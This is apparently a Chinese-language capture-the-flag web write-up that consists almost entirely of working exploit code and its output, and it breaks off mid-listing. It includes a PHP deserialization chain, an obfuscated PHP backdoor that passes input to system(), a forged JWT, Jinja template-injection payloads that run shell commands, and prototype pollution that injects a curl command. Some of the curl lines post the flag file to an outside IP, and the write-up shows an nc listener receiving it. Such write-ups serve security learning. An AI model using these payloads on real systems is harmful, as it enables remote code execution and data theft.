+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Funny&#123;</span><br><span class="line">    public $name = &quot;php://filter/convert.base64-encode/resource=backdoor_a5f9d3.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$fun = new Fun();</span><br><span class="line">$fun2 = new Fun();</span><br><span class="line">$fun-&gt;secret = new Funny();</span><br><span class="line">$fun2-&gt;secret = $fun;</span><br><span class="line">//unserialize(serialize($fun2));</span><br><span class="line">echo urlencode(base64_encode(serialize($fun2)));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.93.30.67:38017/?p=TzozOiJGdW4iOjE6e3M6Njoic2VjcmV0IjtPOjM6IkZ1biI6MTp7czo2OiJzZWNyZXQiO086NToiRnVubnkiOjE6e3M6NDoibmFtZSI7czo2MzoicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1iYWNrZG9vcl9hNWY5ZDMucGhwIjt9fX0%3D</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">f = open(&quot;1&quot;)</span><br><span class="line">f_res = base64.b64decode(f.read())</span><br><span class="line">f_res = f_res.replace(&quot;eval&quot;.encode(), &quot;print_r&quot;.encode())</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">ff = open(&quot;1.php&quot;, &quot;w&quot;)</span><br><span class="line">ff.write(f_res.decode())</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    r = os.popen(&quot;/Applications/MAMP/bin/php/php8.2.0/bin/php 1.php&quot;).read().strip()</span><br><span class="line">    print(len(r))</span><br><span class="line">    ff = open(&quot;1.php&quot;, &quot;w&quot;)</span><br><span class="line">    if &quot;error&quot; in r:</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        ff.write(&quot;&lt;?php echo&quot; + r[4:])</span><br><span class="line">        print(r)</span><br><span class="line">    ff.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$erzo_f851f55b = [base64_decode(&#x27;ZmxhZ3sjX2FiY2RlZn0=&#x27;), base64_decode(&#x27;ZmxhZ3tiMHdfYjB3fQ==&#x27;), base64_decode(&#x27;ZmxhZ3t0ZXRfZmxhZ30=&#x27;), base64_decode(&#x27;ZmxhZ3s5OSF6elN3Y30=&#x27;), base64_decode(&#x27;ZmxhZ3tkZWJ1R19mdHd9&#x27;), base64_decode(&#x27;ZmxhZ3toZWxsX3llYWh9&#x27;), base64_decode(&#x27;ZmxhZ3t0NHN0fQ==&#x27;)];</span><br><span class="line">$igxc_9ce88802 = &#x27;&#x27;;</span><br><span class="line">$bbmg_1b267619 = 0;</span><br><span class="line">foreach ($erzo_f851f55b as &amp;$djkg_417c4fa3) &#123;</span><br><span class="line">    $igxc_9ce88802 = $djkg_417c4fa3[$bbmg_1b267619] . $igxc_9ce88802;</span><br><span class="line">    $bbmg_1b267619++;</span><br><span class="line">&#125;;</span><br><span class="line">if (isset($_GET[$igxc_9ce88802])) &#123;</span><br><span class="line">    $grxe_fd6b6fc9 = $_GET[$igxc_9ce88802];</span><br><span class="line">    $pgck_32cfe6c1 = base64_decode($grxe_fd6b6fc9);</span><br><span class="line">    $jipp_8a561003 = substr($pgck_32cfe6c1, 5, -5);</span><br><span class="line">    echo $jipp_8a561003;</span><br><span class="line">    system($jipp_8a561003);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo base64_decode(&#x27;NDA0&#x27;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://47.93.30.67:38017/backdoor_a5f9d3.php?4h&#123;galf=YWFhYWFscyAvYWFhYWE=</span><br><span class="line">/readflagUsage: /readflag give me the flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.93.30.67:38017/backdoor_a5f9d3.php?4h&#123;galf=YWFhYWEvcmVhZGZsYWcgZ2l2ZSBtZSB0aGUgZmxhZ2FhYWFh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/readflag give me the flagflag&#123;cQfGDnSt85Mxkua2u9hxSeshES8sK2s8&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    </span><br><span class="line">    if(argc &lt; 5) &#123;</span><br><span class="line">        printf(&quot;Usage: %s give me the flag\n&quot;, argv[0]);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ((strcmp(argv[1], &quot;give&quot;) | strcmp(argv[2], &quot;me&quot;) | strcmp(argv[3], &quot;the&quot;) | strcmp(argv[4], &quot;flag&quot;)) != 0) &#123;</span><br><span class="line">        puts(&quot;You are not worthy&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char flag[256] = &#123; 0 &#125;;</span><br><span class="line">    FILE* fp = fopen(&quot;/flag&quot;, &quot;r&quot;);</span><br><span class="line">    if (!fp) &#123;</span><br><span class="line">        perror(&quot;fopen&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if (fread(flag, 1, 256, fp) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;fread&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(flag);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="完美网站">完美网站</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://39.107.27.191:21600/\?img\=dHVwaWFuLnBuZw\=\=</span><br><span class="line">别重定向了，赶快让我（?n=30-10,以内的数值。)-_-&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: n in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;11&lt;/b&gt;&lt;br /&gt;</span><br></pre></td></tr></table></figure>
+<p>固定n爆破拿到图片，尾部ffffpq.php。</p>
+<h3 id="不太喜欢flask的开发">不太喜欢flask的开发</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Werkzeug/2.2.3 Python/3.10.1</span><br><span class="line">Date: Fri, 28 Apr 2023 14:37:37 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 115</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">you are not our client,please guess our SECRET_KEY and Generating cookies using keys ,then view /search?flag=***** </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /search?flag=***** HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 401 UNAUTHORIZED</span><br><span class="line">Server: Werkzeug/2.2.3 Python/3.10.1</span><br><span class="line">Date: Fri, 28 Apr 2023 14:39:32 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 49</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;msg&quot;:&quot;Missing cookie \&quot;access_token_cookie\&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>Jwt加密，密码是tomcat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;admin&quot;</span><br><span class="line">&#125;</span><br><span class="line"># eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.p7j5Fnbpfmw45f43J0ZkFs_JXs1h_rRozLAZEjsbdVM</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /search?flag=&#123;&#123;config&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.p7j5Fnbpfmw45f43J0ZkFs_JXs1h_rRozLAZEjsbdVM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>提示flag{the_flag_in_the_source_code}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /search?flag=&#123;&#123;lipsum[&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x6fs&quot;][&quot;popen&quot;](&quot;tac+app\x2epy&quot;)[&quot;rea\x64&quot;]()&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 123.56.175.221:48127</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh-CN;q=0.9,zh;q=0.8,en;q=0.7,ja;q=0.6</span><br><span class="line">Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.p7j5Fnbpfmw45f43J0ZkFs_JXs1h_rRozLAZEjsbdVM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>flag{SsTi_IS_InTerEstinG!!!!!}</p>
+<h3 id="just_proto">JUST_PROTO</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> res.<span class="title function_">send</span>(<span class="string">&#x27;嗨嗨嗨！！老八来了！！！&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ba = &#123;</span><br><span class="line">    <span class="attr">baba</span>: <span class="function">(<span class="params">token</span>)=&gt;</span>&#123; <span class="keyword">return</span> !!token &#125;,</span><br><span class="line">    <span class="attr">bababa</span>: <span class="function">()=&gt;</span>&#123; <span class="keyword">if</span> (<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(date).<span class="property">length</span> &gt; <span class="number">10000</span>) date = &#123;&#125; &#125;, </span><br><span class="line">    <span class="comment">// set: `redis-cli -h $&#123;ba.redis_host&#125; set `</span></span><br><span class="line">    <span class="comment">// get: `redis-cli -h $&#123;ba.redis_host&#125; get `</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> date = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/set&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    ba.<span class="title function_">bababa</span>(); </span><br><span class="line">    <span class="keyword">const</span> &#123;token, key, val&#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ba.<span class="title function_">baba</span>(token) || !val) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;wrong&quot;</span>); </span><br><span class="line">    date[token][key] = val; </span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/get&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;token, key&#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ba.<span class="title function_">baba</span>(token)) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> result = date[token];</span><br><span class="line">    <span class="keyword">if</span> (result) result = result[key];</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">result</span>: result === <span class="literal">undefined</span> ? <span class="string">&quot;null&quot;</span> : result, <span class="attr">is_succ</span>: result !== <span class="literal">undefined</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/bkup&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> date_stream = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(date)); </span><br><span class="line">    <span class="keyword">const</span> cmd = ba.<span class="property">redis_set</span> + <span class="string">`date <span class="subst">$&#123;date_stream.toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span>;</span><br><span class="line">    <span class="title function_">exec</span>(cmd, <span class="function">(<span class="params">err,_,__</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">        res.<span class="title function_">json</span>(&#123; <span class="attr">is_succ</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`嗨嗨嗨！！老八来了！！！`</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//没敢吧所有变量名换成bababa 怕被打</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.106.154.70:26132/set?token=__proto__&amp;key=redis_set&amp;val=curl%20-F%20%22x=@/flag%22%20-X%20POST%20http://175.178.111.34:7777</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(base) ubuntu@VM-8-15-ubuntu:~$ nc -lvvp 7777</span><br><span class="line">Listening on 0.0.0.0 7777</span><br><span class="line">Connection received on 39.107.243.76 11515</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 175.178.111.34:7777</span><br><span class="line">User-Agent: curl/7.52.1</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 232</span><br><span class="line">Expect: 100-continue</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------d021bc79c8a15513</span><br><span class="line"></span><br><span class="line">--------------------------d021bc79c8a15513</span><br><span class="line">Content-Disposition: form-data; name=&quot;x&quot;; filename=&quot;flag&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">flag&#123;MbkFk47Rxcn3eJFRt2CmwxxWsWQw2VGa&#125;</span><br><span class="line"></span><br><span class="line">--------------------------d021bc79c8a15513--</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(２４)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;&#123;% set cmd=()%&#125;&#123;%if x.eval(cmd)%&#125;aaa&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str = requests.get(</span><br><span class="line">    &quot;http://127.0.0.1:7777/2023/gz/no.php?cmd=&quot; + &#x27;cat /f1ag_g4lfcdecddefewfebge /|curl -d @- -X POST http://175.178.111.34:7777&#x27;).text</span><br><span class="line">result = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def half2full(half):</span><br><span class="line">    full = &#x27;&#x27;</span><br><span class="line">    for ch in half:</span><br><span class="line">        if ord(ch) in range(33, 127):</span><br><span class="line">            ch = chr(ord(ch) + 0xfee0)</span><br><span class="line">        elif ord(ch) == 32:</span><br><span class="line">            ch = chr(0x3000)</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">        full += ch</span><br><span class="line">    return full</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in re.findall(&#x27;\d&#123;2,3&#125;&#x27;, str):</span><br><span class="line">    result += &quot;chr(&quot; + half2full(i) + &quot;)~&quot;</span><br><span class="line">    # print(i)</span><br><span class="line">print(result[:-1])</span><br><span class="line"></span><br><span class="line">res = &quot;&#123;% set po=dict(po=a,p=a)|join%&#125;&#123;% set a=(()|select|string|list)|attr(po)(２４)%&#125;&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr=x.chr%&#125;&#123;% set cmd=(&quot; + result[:-1] + &quot;)%&#125;&#123;%if x.eval(cmd)%&#125;aaa&#123;%endif%&#125;&quot;</span><br><span class="line">url = &quot;http://39.107.82.169:63151/?miniID=&quot; + res</span><br><span class="line">requests.get(url=url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(base) ubuntu@VM-8-15-ubuntu:~$ nc -lvvp 7777</span><br><span class="line">Listening on 0.0.0.0 7777</span><br><span class="line">Connection received on 39.107.243.76 31879</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 175.178.111.34:7777</span><br><span class="line">User-Agent: curl/7.64.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 38</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">flag&#123;GCqYdG6x8Dt7Q3rvQfWuvx28UxC9Ctrx&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,render_template,request,render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods = [&#x27;POST&#x27;,&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">  